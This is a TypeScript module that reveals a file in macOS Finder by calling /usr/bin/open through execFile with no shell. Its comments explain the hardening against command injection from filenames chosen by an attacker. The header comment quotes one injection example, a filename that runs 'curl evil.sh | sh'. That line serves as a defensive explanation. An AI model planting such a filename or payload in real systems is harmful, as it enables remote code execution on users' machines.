/**
 * **THE ONLY MODULE IN THIS APPLICATION THAT INVOKES THE OPERATING SYSTEM.** Spec §10.
 *
 * It does exactly one thing: asks Finder to show a file. It is the escape hatch for a file the app
 * cannot display — ruled 2026-08-09: *"for non compliant file types, wherever the reveal
 * and finder option lives is the users path."*
 *
 * **Why this file is allowed to exist at all.** `eslint.config.js` bans `child_process` in every
 * module, and its message says adding the exception is *"an escalation to the operator and the security review, not a
 * local decision."* That clause is not ceremony: the security review ratified the import ban on 2026-08-06
 * *"without reservation"* on the reasoning that an import is an unaliasable chokepoint, then
 * **withdrew the ratification the next day** — four routes around it were demonstrated against the
 * committed config, all linting clean, leaving live command injection in the Core. The escalation was
 * put to the operator on 2026-08-14 and granted. **The exception names this file and no directory**, so a
 * second §10 action comes back through the same door.
 *
 * ---
 *
 * **THE ATTACK THIS IS SHAPED AGAINST, because every line below is a response to it.**
 *
 * The zero-dependency translation of Electron's `shell.openPath` is `exec("open \"" + path + "\"")`.
 * Filenames in this app are **attacker-controlled**: any agent with write access to the user's tree
 * chooses them. A file named
 *
 *     note"; curl evil.sh | sh; #.md
 *
 * ends the quoted argument, runs a command, and comments out the rest. That is not a hypothetical
 * about a hostile user — it is a hypothetical about a *confused* one, and this app's whole premise is
 * that agents write into the tree it reads.
 *
 * `execFile` with an argument array is immune **by construction rather than by care**: there is no
 * shell to parse the string, so the path is handed to the kernel as one opaque argument no matter
 * what bytes it contains. Nothing here escapes or sanitises anything, because nothing here builds a
 * command line for something else to parse. That is the entire design.
 */

import { execFile } from 'node:child_process'

import { ErrorCode, fail, ok, type Result } from '../core/errors'

/**
 * The binary, by absolute path.
 *
 * **Never bare `open`.** A bare name is resolved through `PATH`, and `PATH` is inherited from
 * whatever launched the process — a login shell, launchd, a test harness. Anything earlier on it
 * named `open` wins. An absolute path cannot be shadowed.
 */
const OPEN_BINARY = '/usr/bin/open'

/**
 * `-R` REVEALS. Without it the same binary **opens** the file in whatever application claims it —
 * which is Open in Default App, the verb the operator CUT from v1 on 2026-08-09 (§10, §21).
 *
 * So the difference between the feature that shipped and the feature that was deliberately removed
 * is **two characters**, and nothing about `open` announces that. It is a named constant so the flag
 * has somewhere to be explained, and `reveal.test.ts` fails if it goes missing.
 */
const REVEAL_FLAG = '-R'

/**
 * `--` ends option parsing, so a file legitimately named `-n` is a path rather than a flag.
 *
 * Belt and braces alongside the absolute path below — `open -R -- /Users/…` cannot misread its own
 * argument. Cheap, and the failure it prevents is `open` interpreting a filename as an instruction.
 */
const END_OF_OPTIONS = '--'

/** How long Finder gets. It is a local GUI call; anything beyond this is a hang, not slowness. */
export const REVEAL_TIMEOUT_MS = 5_000

export interface RevealSeam {
  readonly run: (
    binary: string,
    args: readonly string[],
  ) => Promise<{ readonly ok: true } | { readonly ok: false; readonly detail: string }>
}

/**
 * The real invocation, and the only place `execFile` is called.
 *
 * **`shell: false` is stated explicitly even though it is the default.** §10 names it, a default can
 * be changed by a later Node major, and a reader auditing this line should not have to know which
 * version's default applied.
 *
 * **The environment is minimal rather than inherited.** `open` needs almost nothing, and a child
 * process handed the parent's environment inherits every secret in it. This app holds session tokens
 * in memory, not in `process.env`, so today that is hygiene rather than a fix — which is the right
 * time to do it.
 */
function systemOpen(): RevealSeam {
  return {
    run: (binary, args) =>
      new Promise(resolve => {
        execFile(
          binary,
          [...args],
          {
            shell: false,
            timeout: REVEAL_TIMEOUT_MS,
            // `HOME` alone: `open` resolves the user's session from it. No PATH — the binary is
            // absolute, so there is nothing to resolve.
            env: { HOME: process.env['HOME'] ?? '' },
          },
          error => {
            if (error === null) { resolve({ ok: true }); return }
            resolve({ ok: false, detail: error.message })
          },
        )
      }),
  }
}

/**
 * Reveals an absolute path in Finder.
 *
 * **This function does NOT validate the path, and that is deliberate rather than an omission.** The
 * check that matters is `walkAndVerify` in `core/fs/containment.ts`, which `lstat`s every segment
 * from the registered root down and refuses a symlinked one — after it succeeds there is no symlink
 * anywhere in the composed path, so the composed path **is** the real path. §10 asks for exactly
 * that: *"check the realpath, never the client string."*
 *
 * Re-deriving a second check here would be the failure this build has recorded five times: two
 * controls that look like one, drifting apart, with each reader assuming the other one is the real
 * one. The caller in `services.ts` walks first and passes the composed path; that ordering is
 * asserted by **`test/server/reveal-containment.test.ts`**, because it is the whole security
 * argument.
 *
 * **That sentence named no file until 2026-08-15, and was false when it did not.** The security review's P12
 * review (C1) checked it: `resolveVerifiedPath` appeared **zero** times in `test/`, against a
 * positive control of 20 for `walkAndVerify`, and every `file.reveal` hit was a carriage assertion.
 * The control was present and correct; the proof of it did not exist, on the largest OS escalation
 * in the build. **A comment claiming coverage is not coverage**, and this was the sixth instance of
 * that in this codebase.
 *
 * The named test drives this route's handler against a real temp tree and asserts both halves —
 * refused with the right code, and **the seam never invoked**. Removing the `resolveVerifiedPath`
 * call from `services.ts` turns 8 of its 9 cases red. **If that file is ever deleted, this paragraph
 * becomes a lie again — delete this paragraph with it.**
 *
 * The one thing checked here is that the path is absolute — not as a security control, but because a
 * relative path handed to `open` resolves against the server process's working directory, which is
 * a wrong answer rather than a refusal.
 */
export async function revealInFinder(
  absolutePath: string,
  seam: RevealSeam = systemOpen(),
): Promise<Result<null>> {
  // Index access rather than `startsWith`, and the lint rule is what asked the right question. §5
  // bans prefix comparison **on paths** because `/soil/notes` must not match `/soil/notes-old`;
  // this is a one-character test on one string, which is a different operation that happened to
  // share a method name. `guards.ts:checkRequestTarget` reached the same conclusion for the same
  // reason. The rule earned its keep by making the distinction explicit rather than by being
  // suppressed.
  if (absolutePath[0] !== '/') {
    return fail(ErrorCode.INVALID_ROOT, 'reveal needs an absolute path')
  }

  const outcome = await seam.run(OPEN_BINARY, [REVEAL_FLAG, END_OF_OPTIONS, absolutePath])
  if (!outcome.ok) {
    // §6: no verbatim system strings on the wire. The detail goes to the caller's local log; the
    // client is told the operation failed and nothing about the machine.
    return fail(ErrorCode.IO_FAILED, `could not reveal the file: ${outcome.detail}`)
  }
  return ok(null)
}
